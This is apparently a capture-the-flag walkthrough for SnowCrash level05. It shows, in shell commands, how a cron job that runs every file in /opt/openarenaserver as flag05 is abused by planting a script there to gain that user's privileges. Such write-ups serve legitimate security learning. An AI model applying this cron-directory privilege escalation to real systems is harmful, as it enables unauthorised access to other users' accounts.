```bash
You have new mail.
level05@SnowCrash:~$ ll
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout*
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc*
-r-x------  1 level05 level05  675 Apr  3  2012 .profile*
```
So this time We see that we have received a mail.
In a linux environment we can find things regarding the mail in the /var/mail
Once you have gotten there

```bash
level05@SnowCrash:/var/mail$ ll
total 4
drwxrwsr-x  1 root mail  60 Mar  5  2016 ./
drwxr-xr-x  1 root root 160 Mar 12  2016 ../
-rw-r--r--+ 1 root mail  58 Dec  3 11:31 level05
```
```bash
level05@SnowCrash:/var/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
Let's do some bash understanding now,
what does this script does ?
firstly every 2 minutes, it executes this command :"sh /usr/sbin/openarenaserver" as flag05
Which means what ?
We have to go check this script !

```bash
level05@SnowCrash:/usr/sbin$ cd /usr/sbin
level05@SnowCrash:/usr/sbin$ cat openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
Ok ! what does that mean ?
for every files in the /opt/openarenaserver/ bash will execute the file and then remove it
sooooooooo
because it is executed as flag05, you're thinking what I'm thinking ?

We put our script !
```bash
level05@SnowCrash:/opt/openarenaserver$ echo 'getflag > /tmp/flag' > script.sh
level05@SnowCrash:/opt/openarenaserver$ chmod +x script.sh
level05@SnowCrash:/opt/openarenaserver$ ls
script.sh
```
and now we wait...
<2mins later>
Gj you can now cat your /tmp/flag
GGGG
